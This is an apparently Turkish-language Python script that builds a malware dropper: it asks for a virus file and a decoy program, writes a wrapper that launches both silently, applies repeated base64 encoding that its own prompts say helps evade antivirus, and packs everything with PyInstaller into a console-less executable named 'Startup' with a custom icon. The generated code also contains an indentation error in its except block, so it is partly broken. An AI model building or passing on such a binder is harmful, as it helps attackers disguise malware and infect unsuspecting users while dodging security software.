import PyInstaller.__main__
from encoder import encode





print("[!]Lütfen tüm dosyaları aynı dizinde(Klasör) bulundurun..")
virusname=input("[?]Virüsün adı (örnek.exe) : ")
file=input("[?]Tetiklencek dosyanın adı (örenk_oyun.exe) : ")
print("-"*50)
print("[*]Kodu şifreleme bu şekilde anti virüsler daha zor anlar isteğe bağlı eğer aktif etmek istemez iseniz değeri 0 girin.")
print("[*]NOT:fazla şifreleme dosyanın boyutunu ciddi miktarda artıtırır önerilen 25 tir..")
n = int(input("[?]Kaç kez base64 şifreleme yapmak istersiniz? "))
code =f"""
import subprocess
import os
import sys
import time


def run_hidden_program(exe_name):
    try:
        exe_path = os.path.join(sys._MEIPASS, exe_name)
        subprocess.Popen(exe_path, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
    time.sleep(1)
        exe_path = os.path.join(sys._MEIPASS, exe_name)
        subprocess.Popen(exe_path, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        
run_hidden_program('{virusname}')
run_hidden_program('{file}')

    
"""


if n == 0 or n == "":
    pass
else:
    code = encode(n,code)


with open("code.py","w") as f:
    f.write(code)
    f.close()


PyInstaller.__main__.run([
    '--onefile',   
    '--noconsole',     
    '--name=Startup',  
    f'--add-data={virusname};.', 
    f'--add-data={file};.', 
    '--icon="ico.ico"',
    'code.py'
])
print("[*]Hazır....")
